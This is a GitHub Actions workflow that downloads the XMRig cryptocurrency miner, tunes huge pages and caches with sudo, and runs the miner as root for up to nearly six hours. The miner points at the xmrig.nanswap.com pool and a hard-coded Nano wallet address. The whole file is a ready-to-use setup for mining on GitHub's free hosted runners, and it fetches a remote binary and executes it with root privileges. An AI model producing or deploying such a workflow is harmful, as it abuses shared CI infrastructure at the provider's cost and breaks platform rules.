name: XMRig GitHub-Hosted Tuning

on:
  workflow_dispatch:

jobs:
  optimize-and-run:
    runs-on: ubuntu-latest
    timeout-minutes: 350

    steps:
      - name: System Environment Check
        run: |
          echo "Total RAM:"
          free -h
          echo "CPU Cores:" 
          nproc
          lscpu | grep -i "Model name"

      - name: Kernel-Level Optimization
        run: |
          # 1. Enable Huge Pages (Standard 2MB)
          # GitHub runners usually support 2MB hugepages, but rarely 1GB.
          sudo sysctl -w vm.nr_hugepages=1250
          
          # 2. Clear Cache
          sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches

      - name: Download and Setup XMRig
        run: |
          curl -L -O https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
          tar -xvf xmrig-6.21.0-linux-static-x64.tar.gz

      - name: Execute XMRig
        run: |
          cd xmrig-6.21.0
          # Note: --randomx-1gb-pages often fails on VMs; falling back to standard hugepages
          sudo ./xmrig -o xmrig.nanswap.com:3333 \
          -a rx -k \
          -u nano_3d5psf65d41ckxdnqz5ajuwo1ceo6hq8k4q314oa78doqozye9b6eb5iqpc1 \
          -p GitHubRunner \
          --cpu-priority 5 \
          --randomx-mode=fast
          
